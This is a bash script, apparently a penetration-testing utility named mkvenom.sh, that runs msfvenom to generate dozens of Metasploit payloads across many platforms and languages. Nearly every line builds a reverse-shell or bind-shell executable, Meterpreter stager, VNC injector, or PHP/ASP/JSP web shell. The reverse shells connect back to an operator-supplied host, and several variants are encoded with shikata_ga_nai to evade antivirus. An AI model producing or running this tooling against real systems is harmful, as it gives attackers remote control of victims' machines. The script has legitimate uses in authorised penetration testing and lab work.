#!/bin/bash
# Automatically generate various common MSF payloads for a target.
#
# Usage: mkvenom.sh <target-ip> <target-port> <local-ip> <local-port>
#
# Author: phraxoid@devtty.io, https://devtty.io
# License: MIT

MKVENOM_VER="1.0"

# Wrapper for coloured program message text output:
function fancy_print() {
    local MSG="$(tput setab 0)$(tput setaf 2)$(tput bold)"
    local CLR="$(tput sgr0)"
    echo -e "\n${MSG}$1${CLR}"
}

# Parse command-line arguments:
if [[ "$#" -eq 4 ]] ; then
    TGTIP=$1
    TGTPORT=$2
    LOCIP=$3
    LOCPORT=$4
    OS="all"
elif [[ "$#" -eq 5 ]] ; then
    TGTIP=$1
    TGTPORT=$2
    LOCIP=$3
    LOCPORT=$4
    OS=$5
else
    echo "[!] Error: Incorrect number of arguments."
    echo "[-] Usage: mkvenom.sh <target-ip> <target-port> <local-ip> <local-port> [os]"
    echo "            <target-ip>   - Remote target's IP address."
    echo "            <target-port> - Remote target's port (e.g. for bind shells)."
    echo "            <local-ip>    - Local IP address (e.g. for reverse shell connections)."
    echo "            <local-port>  - Local port (e.g. a MSF multi/handler's listening port)."
    echo "            [os]          - Restrict payload generation to one operating system (optional)."
    echo "                             Valid values: linux, windows, osx, bsd or solaris."
    exit
fi

# Check for pre-existing output directory:
if [ -d "payloads" ] ; then
    fancy_print "[!] Directory 'payloads' already exists, exiting."
    exit
fi

# Create a work directory tree for target:
mkdir ./payloads/
if [ $? -ne 0 ] ; then
    fancy_print "[!] Unexpected result making output directory tree."
    exit
fi

# Startup:
echo "$(tput setaf 3)$(tput bold)"
echo "         __                                  __ "
echo "  __ _  / /___  _____ ___  ___  __ _    ___ / / "
echo " /  ' \/  '_/ |/ / -_) _ \/ _ \/  ' \_ (_-</ _ \\"
echo "/_/_/_/_/\_\|___/\__/_//_/\___/_/_/_(_)___/_//_/"
echo "$(tput sgr0)"
fancy_print "[#] MSF Mass Payload Generator\n[#] Version ${MKVENOM_VER}\n[#] By phraxoid@devtty.io."

fancy_print "[-] Will produce binary payloads for $OS platforms..."

# LHOST=$(ip addr | awk '/inet/ && /${IFACE}/{sub(/\/.*$/,"",$2); print $2}')
# The gist of this is to create a selection of common MSF payloads for each type of popular architecture/platform:
if [ $OS == "linux" ] || [ $OS == "all" ] ; then
    mkdir -p ./payloads/linux/{x64,x86}/src/
    fancy_print "[-] Generating Linux 32-bit C/ELF Meterpreter payloads..."
    msfvenom -a x86 --platform linux -p linux/x86/meterpreter/reverse_tcp LHOST=${LOCIP} LPORT=${LOCPORT} -f elf -o ./payloads/linux/x86/mtr-rev-tcp-stager-p${LOCPORT}.elf ; echo
    msfvenom -a x86 --platform linux -p linux/x86/meterpreter/reverse_tcp LHOST=${LOCIP} LPORT=${LOCPORT} -f c -o ./payloads/linux/x86/src/mtr-rev-tcp-stager-p${LOCPORT}.c ; echo
    msfvenom -a x86 --platform linux -p linux/x86/meterpreter/bind_tcp LPORT=${TGTPORT} -f elf -o ./payloads/linux/x86/mtr-bind-tcp-stager-p${TGTPORT}.elf ; echo
    msfvenom -a x86 --platform linux -p linux/x86/meterpreter/bind_tcp LPORT=${TGTPORT} -f c -o ./payloads/linux/x86/src/mtr-bind-tcp-stager-p${TGTPORT}.c ; echo

    fancy_print "[-] Generating Linux 32-bit C/ELF Shell payloads..."
    msfvenom -a x86 --platform linux -p linux/x86/shell/reverse_tcp LHOST=${LOCIP} LPORT=${LOCPORT} -f elf -o ./payloads/linux/x86/shell-rev-tcp-stager-p${LOCPORT}.elf ; echo
    msfvenom -a x86 --platform linux -p linux/x86/shell/reverse_tcp LHOST=${LOCIP} LPORT=${LOCPORT} -f c -o ./payloads/linux/x86/src/shell-rev-tcp-stager-p${LOCPORT}.c ; echo
    msfvenom -a x86 --platform linux -p linux/x86/shell_reverse_tcp LHOST=${LOCIP} LPORT=${LOCPORT} -f elf -o ./payloads/linux/x86/shell-rev-tcp-inline-p${LOCPORT}.elf ; echo
    msfvenom -a x86 --platform linux -p linux/x86/shell_reverse_tcp LHOST=${LOCIP} LPORT=${LOCPORT} -f c -o ./payloads/linux/x86/src/shell-rev-tcp-inline-p${LOCPORT}.c ; echo
    msfvenom -a x86 --platform linux -p linux/x86/shell/bind_tcp LPORT=${TGTPORT} -f elf -o ./payloads/linux/x86/shell-bind-tcp-stager-p${TGTPORT}.elf ; echo
    msfvenom -a x86 --platform linux -p linux/x86/shell/bind_tcp LPORT=${TGTPORT} -f c -o ./payloads/linux/x86/src/shell-bind-tcp-stager-p${TGTPORT}.c ; echo
    msfvenom -a x86 --platform linux -p linux/x86/shell_bind_tcp LPORT=${TGTPORT} -f elf -o ./payloads/linux/x86/shell-bind-tcp-inline-p${TGTPORT}.elf ; echo
    msfvenom -a x86 --platform linux -p linux/x86/shell_bind_tcp LPORT=${TGTPORT} -f c -o ./payloads/linux/x86/src/shell-bind-tcp-inline-p${TGTPORT}.c ; echo

    fancy_print "[-] Generating Linux 64-bit C/ELF Shell payloads..."
    msfvenom -a x86_64 --platform linux -p linux/x64/shell/reverse_tcp LHOST=${LOCIP} LPORT=${LOCPORT} -f elf -o ./payloads/linux/x64/shell-rev-tcp-stager-p${LOCPORT}.elf ; echo
    msfvenom -a x86_64 --platform linux -p linux/x64/shell/reverse_tcp LHOST=${LOCIP} LPORT=${LOCPORT} -f c -o ./payloads/linux/x64/src/shell-rev-tcp-stager-p${LOCPORT}.c ; echo
    msfvenom -a x86_64 --platform linux -p linux/x64/shell_reverse_tcp LHOST=${LOCIP} LPORT=${LOCPORT} -f elf -o ./payloads/linux/x64/shell-rev-tcp-inline-p${LOCPORT}.elf ; echo
    msfvenom -a x86_64 --platform linux -p linux/x64/shell_reverse_tcp LHOST=${LOCIP} LPORT=${LOCPORT} -f c -o ./payloads/linux/x64/src/shell-rev-tcp-inline-p${LOCPORT}.c ; echo
    msfvenom -a x86_64 --platform linux -p linux/x64/shell/bind_tcp LPORT=${TGTPORT} -f elf -o ./payloads/linux/x64/shell-bind-tcp-stager-p${TGTPORT}.elf ; echo
    msfvenom -a x86_64 --platform linux -p linux/x64/shell/bind_tcp LPORT=${TGTPORT} -f c -o ./payloads/linux/x64/src/shell-bind-tcp-stager-p${TGTPORT}.c ; echo
    msfvenom -a x86_64 --platform linux -p linux/x64/shell_bind_tcp LPORT=${TGTPORT} -f elf -o ./payloads/linux/x64/shell-bind-tcp-inline-p${TGTPORT}.elf ; echo
    msfvenom -a x86_64 --platform linux -p linux/x64/shell_bind_tcp LPORT=${TGTPORT} -f c -o ./payloads/linux/x64/src/shell-bind-tcp-inline-p${TGTPORT}.c ; echo
fi

if [ $OS == "windows" ] || [ $OS == "all" ] ; then
    mkdir -p ./payloads/windows/{x64,x86}/src/
    fancy_print "[-] Generating Windows 32-bit C/EXE Meterpreter payloads..."
    msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp LHOST=${LOCIP} LPORT=${LOCPORT} -f exe -o ./payloads/windows/x86/mtr-rev-tcp-stager-p${LOCPORT}.exe ; echo
    msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp LHOST=${LOCIP} LPORT=${LOCPORT} -f c -o ./payloads/windows/x86/src/mtr-rev-tcp-stager-p${LOCPORT}.c ; echo
    msfvenom -a x86 --platform windows -p windows/meterpreter_reverse_tcp LHOST=${LOCIP} LPORT=${LOCPORT} -f exe -o ./payloads/windows/x86/mtr-rev-tcp-inline-p${LOCPORT}.exe ; echo
    msfvenom -a x86 --platform windows -p windows/meterpreter_reverse_tcp LHOST=${LOCIP} LPORT=${LOCPORT} -f c -o ./payloads/windows/x86/src/mtr-rev-tcp-inline-p${LOCPORT}.c ; echo
    msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_https LHOST=${LOCIP} LPORT=${LOCPORT} -f exe -o ./payloads/windows/x86/mtr-rev-https-stager-p${LOCPORT}.exe ; echo
    msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_https LHOST=${LOCIP} LPORT=${LOCPORT} -f c -o ./payloads/windows/x86/src/mtr-rev-https-stager-p${LOCPORT}.c ; echo
    msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_https LHOST=${LOCIP} LPORT=${LOCPORT} -e x86/shikata_ga_nai -i 9 -f exe -o ./payloads/windows/x86/mtr-rev-https-stager-shikata9-p${LOCPORT}.exe ; echo
    msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_https LHOST=${LOCIP} LPORT=${LOCPORT} -e x86/shikata_ga_nai -i 9 -f c -o ./payloads/windows/x86/src/mtr-rev-https-shikata9-stager-p${LOCPORT}.c ; echo
    msfvenom -a x86 --platform windows -p windows/meterpreter/bind_tcp LPORT=${TGTPORT} -f exe -o ./payloads/windows/x86/mtr-bind-tcp-stager-p${TGTPORT}.exe ; echo
    msfvenom -a x86 --platform windows -p windows/meterpreter/bind_tcp LPORT=${TGTPORT} -f c -o ./payloads/windows/x86/src/mtr-bind-tcp-stager-p${TGTPORT}.c ; echo
    msfvenom -a x86 --platform windows -p windows/meterpreter_bind_tcp LPORT=${TGTPORT} -f exe -o ./payloads/windows/x86/mtr-bind-tcp-inline-p${TGTPORT}.exe ; echo
    msfvenom -a x86 --platform windows -p windows/meterpreter_bind_tcp LPORT=${TGTPORT} -f c -o ./payloads/windows/x86/src/mtr-bind-tcp-inline-p${TGTPORT}.c ; echo

    fancy_print "[-] Generating Windows 32-bit C/EXE Shell payloads..."
    msfvenom -a x86 --platform windows -p windows/shell/reverse_tcp LHOST=${LOCIP} LPORT=${LOCPORT} -f exe -o ./payloads/windows/x86/shell-rev-tcp-stager-p${LOCPORT}.exe ; echo
    msfvenom -a x86 --platform windows -p windows/shell/reverse_tcp LHOST=${LOCIP} LPORT=${LOCPORT} -f c -o ./payloads/windows/x86/src/shell-rev-tcp-stager-p${LOCPORT}.c ; echo
    msfvenom -a x86 --platform windows -p windows/shell_reverse_tcp LHOST=${LOCIP} LPORT=${LOCPORT} -f exe -o ./payloads/windows/x86/shell-rev-tcp-inline-p${LOCPORT}.exe ; echo
    msfvenom -a x86 --platform windows -p windows/shell_reverse_tcp LHOST=${LOCIP} LPORT=${LOCPORT} -f c -o ./payloads/windows/x86/src/shell-rev-tcp-inline-p${LOCPORT}.c ; echo
    msfvenom -a x86 --platform windows -p windows/shell_reverse_tcp LHOST=${LOCIP} LPORT=${LOCPORT} -e x86/shikata_ga_nai -i 9 -f exe -o ./payloads/windows/x86/shell-rev-tcp-inline-shikata9-p${LOCPORT}.exe ; echo
    msfvenom -a x86 --platform windows -p windows/shell_reverse_tcp LHOST=${LOCIP} LPORT=${LOCPORT} -e x86/shikata_ga_nai -i 9 -f c -o ./payloads/windows/x86/src/shell-rev-tcp-inline-shikata9-p${LOCPORT}.c ; echo
    msfvenom -a x86 --platform windows -p windows/shell/bind_tcp LPORT=${TGTPORT} -f exe -o ./payloads/windows/x86/shell-bind-tcp-stager-p${TGTPORT}.exe ; echo
    msfvenom -a x86 --platform windows -p windows/shell/bind_tcp LPORT=${TGTPORT} -f c -o ./payloads/windows/x86/src/shell-bind-tcp-stager-p${TGTPORT}.c ; echo
    msfvenom -a x86 --platform windows -p windows/shell_bind_tcp LPORT=${TGTPORT} -f exe -o ./payloads/windows/x86/shell-bind-tcp-inline-p${TGTPORT}.exe ; echo
    msfvenom -a x86 --platform windows -p windows/shell_bind_tcp LPORT=${TGTPORT} -f c -o ./payloads/windows/x86/src/shell-bind-tcp-inline-p${TGTPORT}.c ; echo

    fancy_print "[-] Generating Windows 32-bit VNC EXE payloads..."
    msfvenom -a x86 --platform windows -p windows/vncinject/reverse_tcp LHOST=${LOCIP} LPORT=${LOCPORT} -f exe -o ./payloads/windows/x86/vnc-rev-tcp-stager-p${LOCPORT}.exe ; echo

    fancy_print "[-] Generating Windows 64-bit C/EXE Meterpreter payloads..."
    msfvenom -a x86_64 --platform windows -p windows/x64/meterpreter/reverse_tcp LHOST=${LOCIP} LPORT=${LOCPORT} -f exe -o ./payloads/windows/x64/mtr-rev-tcp-stager-p${LOCPORT}.exe ; echo
    msfvenom -a x86_64 --platform windows -p windows/x64/meterpreter/reverse_tcp LHOST=${LOCIP} LPORT=${LOCPORT} -f c -o ./payloads/windows/x64/src/mtr-rev-tcp-stager-p${LOCPORT}.c ; echo
    msfvenom -a x86_64 --platform windows -p windows/x64/meterpreter_reverse_tcp LHOST=${LOCIP} LPORT=${LOCPORT} -f exe -o ./payloads/windows/x64/mtr-rev-tcp-inline-p${LOCPORT}.exe ; echo
    msfvenom -a x86_64 --platform windows -p windows/x64/meterpreter_reverse_tcp LHOST=${LOCIP} LPORT=${LOCPORT} -f c -o ./payloads/windows/x64/src/mtr-rev-tcp-inline-p${LOCPORT}.c ; echo
    msfvenom -a x86_64 --platform windows -p windows/x64/meterpreter/reverse_https LHOST=${LOCIP} LPORT=${LOCPORT} -f exe -o ./payloads/windows/x64/mtr-rev-https-stager-p${LOCPORT}.exe ; echo
    msfvenom -a x86_64 --platform windows -p windows/x64/meterpreter/reverse_https LHOST=${LOCIP} LPORT=${LOCPORT} -f c -o ./payloads/windows/x64/src/mtr-rev-https-stager-p${LOCPORT}.c ; echo
    msfvenom -a x86_64 --platform windows -p windows/x64/meterpreter/reverse_https LHOST=${LOCIP} LPORT=${LOCPORT} -e x86/shikata_ga_nai -i 9 -f exe -o ./payloads/windows/x64/mtr-rev-https-stager-shikata9-p${LOCPORT}.exe ; echo
    msfvenom -a x86_64 --platform windows -p windows/x64/meterpreter/reverse_https LHOST=${LOCIP} LPORT=${LOCPORT} -e x86/shikata_ga_nai -i 9 -f c -o ./payloads/windows/x64/src/mtr-rev-https-stager-shikata9-p${LOCPORT}.c ; echo
    msfvenom -a x86_64 --platform windows -p windows/x64/meterpreter/bind_tcp LPORT=${TGTPORT} -f exe -o ./payloads/windows/x64/mtr-bind-tcp-stager-p${TGTPORT}.exe ; echo
    msfvenom -a x86_64 --platform windows -p windows/x64/meterpreter/bind_tcp LPORT=${TGTPORT} -f c -o ./payloads/windows/x64/src/mtr-bind-tcp-stager-p${TGTPORT}.c ; echo
    msfvenom -a x86_64 --platform windows -p windows/x64/meterpreter_bind_tcp LPORT=${TGTPORT} -f exe -o ./payloads/windows/x64/mtr-bind-tcp-inline-p${TGTPORT}.exe ; echo
    msfvenom -a x86_64 --platform windows -p windows/x64/meterpreter_bind_tcp LPORT=${TGTPORT} -f c -o ./payloads/windows/x64/src/mtr-bind-tcp-inline-p${TGTPORT}.c ; echo

    fancy_print "[-] Generating Windows 64-bit C/EXE Shell payloads..."
    msfvenom -a x86_64 --platform windows -p windows/x64/shell/reverse_tcp LHOST=${LOCIP} LPORT=${LOCPORT} -f exe -o ./payloads/windows/x64/shell-rev-tcp-stager-p${LOCPORT}.exe ; echo
    msfvenom -a x86_64 --platform windows -p windows/x64/shell/reverse_tcp LHOST=${LOCIP} LPORT=${LOCPORT} -f c -o ./payloads/windows/x64/src/shell-rev-tcp-stager-p${LOCPORT}.c ; echo
    msfvenom -a x86_64 --platform windows -p windows/x64/shell_reverse_tcp LHOST=${LOCIP} LPORT=${LOCPORT} -f exe -o ./payloads/windows/x64/shell-rev-tcp-inline-p${LOCPORT}.exe ; echo
    msfvenom -a x86_64 --platform windows -p windows/x64/shell_reverse_tcp LHOST=${LOCIP} LPORT=${LOCPORT} -f c -o ./payloads/windows/x64/src/shell-rev-tcp-inline-p${LOCPORT}.c ; echo
    msfvenom -a x86_64 --platform windows -p windows/x64/shell_reverse_tcp LHOST=${LOCIP} LPORT=${LOCPORT} -e x86/shikata_ga_nai -i 9 -f exe -o ./payloads/windows/x64/shell-rev-tcp-inline-shikata9-p${LOCPORT}.exe ; echo
    msfvenom -a x86_64 --platform windows -p windows/x64/shell_reverse_tcp LHOST=${LOCIP} LPORT=${LOCPORT} -e x86/shikata_ga_nai -i 9 -f c -o ./payloads/windows/x64/src/shell-rev-tcp-inline-shikata9-p${LOCPORT}.c ; echo
    msfvenom -a x86_64 --platform windows -p windows/x64/shell/bind_tcp LPORT=${TGTPORT} -f exe -o ./payloads/windows/x64/shell-bind-tcp-stager-p${TGTPORT}.exe ; echo
    msfvenom -a x86_64 --platform windows -p windows/x64/shell/bind_tcp LPORT=${TGTPORT} -f c -o ./payloads/windows/x64/src/shell-bind-tcp-stager-p${TGTPORT}.c ; echo
    msfvenom -a x86_64 --platform windows -p windows/x64/shell_bind_tcp LPORT=${TGTPORT} -f exe -o ./payloads/windows/x64/shell-bind-tcp-inline-p${TGTPORT}.exe ; echo
    msfvenom -a x86_64 --platform windows -p windows/x64/shell_bind_tcp LPORT=${TGTPORT} -f c -o ./payloads/windows/x64/src/shell-bind-tcp-inline-p${TGTPORT}.c ; echo

    fancy_print "[-] Generating Windows 64-bit VNC EXE payloads..."
    msfvenom -a x86_64 --platform windows -p windows/x64/vncinject/reverse_tcp LHOST=${LOCIP} LPORT=${LOCPORT} -f exe -o ./payloads/windows/x64/vnc-rev-tcp-stager-p${LOCPORT}.exe ; echo
fi

if [ $OS == "bsd" ] || [ $OS == "all" ] ; then
    mkdir -p ./payloads/bsd/{x64,x86}/src/
    fancy_print "[-] Generating FreeBSD 32-bit C/ELF Shell payloads..."
    msfvenom -a x86 --platform bsd -p bsd/x86/shell/reverse_tcp LHOST=${LOCIP} LPORT=${LOCPORT} -f elf -o ./payloads/bsd/x86/shell-rev-tcp-stager-p${LOCPORT}.elf ; echo
    msfvenom -a x86 --platform bsd -p bsd/x86/shell/reverse_tcp LHOST=${LOCIP} LPORT=${LOCPORT} -f c -o ./payloads/bsd/x86/src/shell-rev-tcp-stager-p${LOCPORT}.c ; echo
    msfvenom -a x86 --platform bsd -p bsd/x86/shell_reverse_tcp LHOST=${LOCIP} LPORT=${LOCPORT} -f elf -o ./payloads/bsd/x86/shell-rev-tcp-inline-p${LOCPORT}.elf ; echo
    msfvenom -a x86 --platform bsd -p bsd/x86/shell_reverse_tcp LHOST=${LOCIP} LPORT=${LOCPORT} -f c -o ./payloads/bsd/x86/src/shell-rev-tcp-inline-p${LOCPORT}.c ; echo
    msfvenom -a x86 --platform bsd -p bsd/x86/shell/bind_tcp LPORT=${TGTPORT} -f elf -o ./payloads/bsd/x86/shell-bind-tcp-stager-p${TGTPORT}.elf ; echo
    msfvenom -a x86 --platform bsd -p bsd/x86/shell/bind_tcp LPORT=${TGTPORT} -f c -o ./payloads/bsd/x86/src/shell-bind-tcp-stager-p${TGTPORT}.c ; echo
    msfvenom -a x86 --platform bsd -p bsd/x86/shell_bind_tcp LPORT=${TGTPORT} -f elf -o ./payloads/bsd/x86/shell-bind-tcp-inline-p${TGTPORT}.elf ; echo
    msfvenom -a x86 --platform bsd -p bsd/x86/shell_bind_tcp LPORT=${TGTPORT} -f c -o ./payloads/bsd/x86/src/shell-bind-tcp-inline-p${TGTPORT}.c ; echo

    fancy_print "[-] Generating FreeBSD 64-bit C/ELF Shell payloads..."
    msfvenom -a x86_64 --platform bsd -p bsd/x64/shell_reverse_tcp LHOST=${LOCIP} LPORT=${LOCPORT} -f elf -o ./payloads/bsd/x64/shell-rev-tcp-inline-p${LOCPORT}.elf ; echo
    msfvenom -a x86_64 --platform bsd -p bsd/x64/shell_reverse_tcp LHOST=${LOCIP} LPORT=${LOCPORT} -f c -o ./payloads/bsd/x64/src/shell-rev-tcp-inline-p${LOCPORT}.c ; echo
    msfvenom -a x86_64 --platform bsd -p bsd/x64/shell_bind_tcp LPORT=${TGTPORT} -f elf -o ./payloads/bsd/x64/shell-bind-tcp-inline-p${TGTPORT}.elf ; echo
    msfvenom -a x86_64 --platform bsd -p bsd/x64/shell_bind_tcp LPORT=${TGTPORT} -f c -o ./payloads/bsd/x64/src/shell-bind-tcp-inline-p${TGTPORT}.c ; echo
fi

if [ $OS == "osx" ] || [ $OS == "all" ] ; then
    mkdir -p ./payloads/osx/{x64,x86}/src/
    fancy_print "[-] Generating OSX 32-bit C/ELF Shell payloads..."
    msfvenom -a x86 --platform osx -p osx/x86/shell_reverse_tcp LHOST=${LOCIP} LPORT=${LOCPORT} -f macho -o ./payloads/osx/x86/shell-rev-tcp-inline-p${LOCPORT}.macho ; echo
    msfvenom -a x86 --platform osx -p osx/x86/shell_reverse_tcp LHOST=${LOCIP} LPORT=${LOCPORT} -f c -o ./payloads/osx/x86/src/shell-rev-tcp-inline-p${LOCPORT}.c ; echo
    msfvenom -a x86 --platform osx -p osx/x86/shell_bind_tcp LPORT=${TGTPORT} -f macho -o ./payloads/osx/x86/shell-bind-tcp-inline-p${TGTPORT}.macho ; echo
    msfvenom -a x86 --platform osx -p osx/x86/shell_bind_tcp LPORT=${TGTPORT} -f c -o ./payloads/osx/x86/src/shell-bind-tcp-inline-p${TGTPORT}.c ; echo

    fancy_print "[-] Generating OSX 64-bit C/ELF Shell payloads..."
    msfvenom -a x86_64 --platform osx -p osx/x64/shell_reverse_tcp LHOST=${LOCIP} LPORT=${LOCPORT} -f macho -o ./payloads/osx/x64/shell-rev-tcp-inline-p${LOCPORT}.macho ; echo
    msfvenom -a x86_64 --platform osx -p osx/x64/shell_reverse_tcp LHOST=${LOCIP} LPORT=${LOCPORT} -f c -o ./payloads/osx/x64/src/shell-rev-tcp-inline-p${LOCPORT}.c ; echo
    msfvenom -a x86_64 --platform osx -p osx/x64/shell_bind_tcp LPORT=${TGTPORT} -f macho -o ./payloads/osx/x64/shell-bind-tcp-inline-p${TGTPORT}.macho ; echo
    msfvenom -a x86_64 --platform osx -p osx/x64/shell_bind_tcp LPORT=${TGTPORT} -f c -o ./payloads/osx/x64/src/shell-bind-tcp-inline-p${TGTPORT}.c ; echo
fi

if [ $OS == "solaris" ] || [ $OS == "all" ] ; then
    mkdir -p ./payloads/solaris/{x86,sparc}/src/
    fancy_print "[-] Generating Solaris 32-bit C/ELF Shell payloads..."
    msfvenom -a x86 --platform solaris -p solaris/x86/shell_reverse_tcp LHOST=${LOCIP} LPORT=${LOCPORT} -f elf -o ./payloads/solaris/x86/shell-rev-tcp-inline-p${LOCPORT}.elf ; echo
    msfvenom -a x86 --platform solaris -p solaris/x86/shell_reverse_tcp LHOST=${LOCIP} LPORT=${LOCPORT} -f c -o ./payloads/solaris/x86/src/shell-rev-tcp-inline-p${LOCPORT}.c ; echo
    msfvenom -a x86 --platform solaris -p solaris/x86/shell_bind_tcp LPORT=${TGTPORT} -f elf -o ./payloads/solaris/x86/shell-bind-tcp-inline-p${TGTPORT}.elf ; echo
    msfvenom -a x86 --platform solaris -p solaris/x86/shell_bind_tcp LPORT=${TGTPORT} -f c -o ./payloads/solaris/x86/src/shell-bind-tcp-inline-p${TGTPORT}.c ; echo

    fancy_print "[-] Generating Solaris SPARC C Shell payloads..."
    msfvenom -a sparc --platform solaris -p solaris/sparc/shell_reverse_tcp LHOST=${LOCIP} LPORT=${LOCPORT} -f c -o ./payloads/solaris/sparc/src/shell-rev-tcp-inline-p${LOCPORT}.c ; echo
    msfvenom -a sparc --platform solaris -p solaris/sparc/shell_bind_tcp LPORT=${TGTPORT} -f c -o ./payloads/solaris/sparc/src/shell-bind-tcp-inline-p${TGTPORT}.c ; echo
fi

fancy_print "[-] Generating PHP Meterpreter payloads..."
mkdir -p ./payloads/php/
msfvenom -a php --platform php -p php/meterpreter/reverse_tcp LHOST=${LOCIP} LPORT=${LOCPORT} -f raw -o ./payloads/php/mtr-rev-tcp-stager-p${LOCPORT}.php ; echo
msfvenom -a php --platform php -p php/meterpreter_reverse_tcp LHOST=${LOCIP} LPORT=${LOCPORT} -f raw -o ./payloads/php/mtr-rev-tcp-inline-p${LOCPORT}.php ; echo
msfvenom -a php --platform php -p php/meterpreter/bind_tcp LPORT=${TGTPORT} -f raw -o ./payloads/php/mtr-bind-tcp-stager-p${TGTPORT}.php ; echo

fancy_print "[-] Generating PHP Shell payloads..."
msfvenom -a php --platform php -p php/reverse_php LHOST=${LOCIP} LPORT=${LOCPORT} -f raw -o ./payloads/php/shell-rev-tcp-inline-p${LOCPORT}.php ; echo
msfvenom -a php --platform php -p php/bind_php LPORT=${TGTPORT} -f raw -o ./payloads/php/shell-bind-tcp-inline-p${TGTPORT}.php ; echo

fancy_print "[-] Generating ASP Meterpreter payloads..."
mkdir -p ./payloads/asp/
msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp LHOST=${LOCIP} LPORT=${LOCPORT} -f asp -o ./payloads/asp/mtr-rev-tcp-stager-p${LOCPORT}.asp ; echo
msfvenom -a x86 --platform windows -p windows/meterpreter/bind_tcp LPORT=${TGTPORT} -f asp -o ./payloads/asp/mtr-bind-tcp-stager-p${TGTPORT}.asp ; echo

fancy_print "[-] Generating ASP Shell payloads..."
msfvenom -a x86 --platform windows -p windows/shell_reverse_tcp LHOST=${LOCIP} LPORT=${LOCPORT} -f asp -o ./payloads/asp/shell-rev-tcp-inline-p${LOCPORT}.asp ; echo
msfvenom -a x86 --platform windows -p windows/shell_bind_tcp LPORT=${TGTPORT} -f asp -o ./payloads/asp/shell-bind-tcp-inline-p${TGTPORT}.asp ; echo

fancy_print "[-] Generating Java Shell Payloads..."
mkdir -p ./payloads/java/
msfvenom -p java/jsp_shell_reverse_tcp LHOST=${LOCIP} LPORT=${LOCPORT} -f raw -o ./payloads/java/shell-rev-tcp-inline-p${LOCPORT}.jsp ; echo
msfvenom -p java/jsp_shell_bind_tcp LPORT=${TGTPORT} -f raw -o ./payloads/java/shell-bind-tcp-inline-p${TGTPORT}.jsp ; echo
msfvenom -p java/jsp_shell_reverse_tcp LHOST=${LOCIP} LPORT=${LOCPORT} -f war -o ./payloads/java/shell-rev-tcp-inline-p${LOCPORT}.war ; echo
msfvenom -p java/jsp_shell_bind_tcp LPORT=${TGTPORT} -f war -o ./payloads/java/shell-bind-tcp-inline-p${TGTPORT}.war ; echo

fancy_print "[-] Generating Bash Shell payloads..."
mkdir -p ./payloads/bash/
msfvenom -a cmd --platform unix -p cmd/unix/reverse_bash LHOST=${LOCIP} LPORT=${LOCPORT} -f raw -o ./payloads/bash/shell-rev-tcp-inline-p${LOCPORT}.sh ; echo
msfvenom -a cmd --platform unix -p cmd/unix/reverse_bash_telnet_ssl LHOST=${LOCIP} LPORT=${LOCPORT} -f raw -o ./payloads/bash/shell-rev-tcp-telnet-ssl-inline-p${LOCPORT}.sh ; echo

fancy_print "[-] Generating Perl Shell payloads..."
mkdir -p ./payloads/perl/
msfvenom -a cmd --platform unix -p cmd/unix/reverse_perl LHOST=${LOCIP} LPORT=${LOCPORT} -f raw -o ./payloads/perl/shell-rev-tcp-inline-p${LOCPORT}.pl ; echo
msfvenom -a cmd --platform unix -p cmd/unix/bind_perl LPORT=${TGTPORT} -f raw -o ./payloads/perl/shell-bind-tcp-inline-p${TGTPORT}.pl ; echo

fancy_print "[-] Generating Python Shell & Meterpreter payloads..."
mkdir -p ./payloads/python/
msfvenom -a python --platform python -p python/shell_reverse_tcp LHOST=${LOCIP} LPORT=${LOCPORT} -f raw -o ./payloads/python/shell-rev-tcp-inline-p${LOCPORT}.py ; echo
msfvenom -a python --platform python -p python/meterpreter/reverse_https LHOST=${LOCIP} LPORT=${LOCPORT} -f raw -o ./payloads/python/mtr-rev-https-stager-p${LOCPORT}.exe ; echo

fancy_print "[-] Generating Ruby payloads..."
mkdir -p ./payloads/ruby/
msfvenom -a ruby --platform ruby -p ruby/shell_reverse_tcp LHOST=${LOCIP} LPORT=${LOCPORT} -f raw -o ./payloads/ruby/shell-rev-tcp-inline-p${LOCPORT}.rb ; echo
msfvenom -a ruby --platform ruby -p ruby/shell_bind_tcp LPORT=${TGTPORT} -f raw -o ./payloads/ruby/shell-bind-tcp-inline-p${TGTPORT}.rb ; echo

fancy_print "[-] Finished."
